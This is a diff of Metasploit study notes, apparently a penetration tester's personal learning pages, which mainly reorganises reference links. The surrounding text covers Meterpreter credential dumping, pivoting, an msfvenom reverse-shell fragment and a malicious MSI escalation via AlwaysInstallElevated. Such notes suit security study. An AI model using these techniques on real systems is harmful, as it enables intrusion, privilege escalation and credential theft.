@@ -41,6 +41,8 @@ You can use msfconsole as a shell, but there's no redirect functionality.
 
 Note that you can also call regular shell commands (`ip`, `ls`, etc.) from msfconsole. You can also background processes using Ctrl + Z (Metasploit will trap this, so you don't have to worry about backgrounding the entire msfconsole).
 
+* [Using "nmap"](nmap.md)
+
 ### Modules
 
 Module categories:
@@ -87,6 +89,8 @@ Targeted scanners can be more useful, however:
 
 Metasploit has a variety of Samba/CIFS scanners too (use `search scanner/smb` to list them), as well as modules for basic enumeration such as `smtp_version`/`smtp_enum` (for SMTP) and `mysql_sql` (for MySQL, though this seems to just be a thin wrapper around the MySQL command line client).
 
+* [Metasploit Documentation: Scanning and Managing Hosts](https://docs.rapid7.com/metasploit/scanning-and-managing-hosts/)
+
 ### Payloads
 
 Payloads can be divided into:
@@ -104,6 +108,9 @@ List all available payloads using `msfvenom --list payloads` or `show payloads` 
 A specific payload can be set in the Metasploit console use the `set PAYLOAD full/path/to/payload`.
 
 If you initially get a native shell, use the `post/multi/manage/shell_to_meterpreter` module to upgrade to Meterpeter. (NOTE: shell_to_meterpreter creates a new connection on a new port, by default 4433.)
+
+* [Metasploit Basics, Part 8: Exploitation with EternalBlue](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue)
+* [Metasploit - Payload](https://www.tutorialspoint.com/metasploit/metasploit_payload.htm)
 
 ## Meterpreter
 
@@ -162,6 +169,11 @@ There seem to be a lot of options for the `post/multi/manage/autoroute` and `aux
 
 The advantage of setting up a SOCKS proxy on the target is that you can then use proxychains to route through the target; this can allow you to pivot more deeply into the network that you're attacking. (You probably want to create a custom proxychains.conf file to do this. Fortunately, /etc/proxychains.conf is well documented.)
 
+* [Using John the Ripper](john-the-ripper.md)
+* [Using Hashcat](hashcat.md)
+* [Dumping Windows Password Hashes Using Metasploit](https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf)
+* [Windows Password Hashes](../notes/windows-password-hashes.md)
+
 ### Loading PowerShell
 
 ```meterpreter
@@ -184,6 +196,9 @@ ssp              # Attempt to retrieve ssp creds
 tspkg            # Attempt to retrieve tspkg creds
 wdigest          # Attempt to retrieve wdigest creds
 ```
+
+* [Using Mimikatz](mimikatz.md)
+* [Kerberos](kerberos.md)
 
 ### Log In as a User
 
@@ -213,6 +228,10 @@ In particular, harvesting credentials from LSASS requires that Meterpreter be li
 Another example is that dumping keystrokes will only work when Meterpreter is attached to a word processor or text editor.
 
 Note that Meterpreter will happily let you migrate from a privileged to an unprivileged process - which may cause you to loose control of the target system! Additionally, migrating Meterpreter will change its current working directory to that of the process it's attaching to.
+
+* [How does process migration work in Meterpreter](https://security.stackexchange.com/a/92893)
+* [Multiple Ways to Persistence on Windows 10 with Metasploit](https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/)
+* [Return-orientated programming (Wikipedia)](https://en.wikipedia.org/wiki/Return-oriented_programming)
 
 ## Venom ("msfvenom")
 
@@ -295,20 +314,21 @@ LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.pl
 
 System-specific shell codes can also be produced by appropriately varying the `-f` option.
 
+* [Shell to Meterpreter Upgrade](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter)
+
 ### 32-Bit Windows Programs
 
 By default, msfvenom produces 64-bit executables when using the `-f exe`. This doesn't work, however, if you're trying to replace a program in Program Files (x86). In this case, you'll need to explicitly instruct msfvenom to encode a 32-bit binary using  `-e x86/shikata_ga_nai`.
+
+* [How do you send a 64 bit meterpreter stager?](https://security.stackexchange.com/a/83410)
 
 ### Malicious MSI Files
 
 If `AlwaysInstallElevated`  is set to 1 under both of the following registry keys, then MSI installers will run as SYSTEM.
 
 ```powershell
-reg query \
-	HKCU\Software\Policies\Microsoft\Windows\Installer
-
-reg query \
-	HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 
 Generate a malicious MSI file with msfvenom:
@@ -328,31 +348,3 @@ msiexec /quiet /qn /i $INSTALLER.msi
 ### Catching Shells
 
 Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you'll need to use `set payload` to tell Metasploit *what* it's catching!). We can catch both regular reverse shells and Meterpreter sessions this way.
-
-## References
-
-* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
-* [How does process migration work in Meterpreter](https://security.stackexchange.com/a/92893)
-* [Metasploit Documentation: Scanning and Managing Hosts](https://docs.rapid7.com/metasploit/scanning-and-managing-hosts/)
-* [Metasploit Basics, Part 8: Exploitation with EternalBlue](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue)
-* [Shell to Meterpreter Upgrade](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter)
-* [TryHackMe: CC: Pen Testing](tryhackme-cc-pen-testing.md)
-* [Ice](tryhackme-ice.md)
-* [How do you send a 64 bit meterpreter stager?](https://security.stackexchange.com/a/83410)
-* [Blaster](tryhackme-blaster.md)
-* [Multiple Ways to Persistence on Windows 10 with Metasploit](https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/)
-* [Metasploit - Payload](https://www.tutorialspoint.com/metasploit/metasploit_payload.htm)
-* [TryHackMe: Game Zone](tryhackme-game-zone.md)
-* [Using "nmap"](nmap.md)
-* [Return-orientated programming (Wikipedia)](https://en.wikipedia.org/wiki/Return-oriented_programming)
-* [Kerberos](kerberos.md)
-* [Using John the Ripper](john-the-ripper.md)
-* [Using Hashcat](hashcat.md)
-* [2022-04-13 - ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester](../log/2022-04-13-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.md)
-* [Dumping Windows Password Hashes Using Metasploit](https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf)
-* [Windows Password Hashes](../notes/windows-password-hashes.md)
-* [2022-04-14 - TryHackMe: Jr. Penetration Tester](../log/2022-04-14-tryhackme-jr-penetration-tester.md)
-* [2022-04-18 - ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester](../log/2022-04-18-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.md)
-* [Using Mimikatz](mimikatz.md)
-* [2022-04-21 - TryHackMe: Jr. Penetration Tester](../log/2022-04-21-tryhackme-jr-penetration-tester.md)
-* [slyth11907 / Cheatsheets](https://github.com/slyth11907/Cheatsheets)
